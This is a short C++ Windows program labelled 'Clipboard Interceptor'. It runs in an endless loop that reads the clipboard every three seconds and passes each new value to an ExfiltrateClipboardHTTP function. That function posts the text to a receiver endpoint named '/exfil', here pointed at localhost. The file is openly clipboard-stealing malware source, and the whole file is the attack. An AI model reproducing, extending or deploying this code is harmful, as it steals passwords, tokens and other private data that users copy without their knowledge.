#include <iostream>
#include <windows.h>
#include <string>
#include <thread>

#include <clipboard.h>
#include <tools.h>
#include <httpexfil.h>

// Console ouput UTF_16 format, TODO REMOVE
#include <fcntl.h>
#include <io.h>

void HandleNewData(std::wstring& data)
{
    std::string utf8_data = WStringToUtf8(data);
    
    std::wcout << L"[*] New Clipboard Content:\n\n" << data << L"\n\n";
    std::wcout << L"Sending data to receiver...\n";

    try
    {
        ExfiltrateClipboardHTTP(utf8_data, "127.0.0.1", "/exfil", 80);
    }
    catch(const std::exception& ex)
    {
        std::wcout << L"Error when sending data to receiver: " << ex.what() << "\n";
    }
    catch(...)
    {
        std::wcout << L"Unknown exception occured when sending data to receiver.\n";
    }
}

int main() {
    // Console ouput UTF_16 format, TODO REMOVE
    _setmode(_fileno(stdout), _O_U16TEXT);

    std::wcout << L"[*] Clipboard Interceptor Started\n";
    std::wstring lastClipboard = L"";

    while(true)
    {
        std::wstring currentClipboard = GetClipboardText();

        if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
        {
            HandleNewData(currentClipboard);  
            lastClipboard = currentClipboard;
        }

        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    return 0;
}
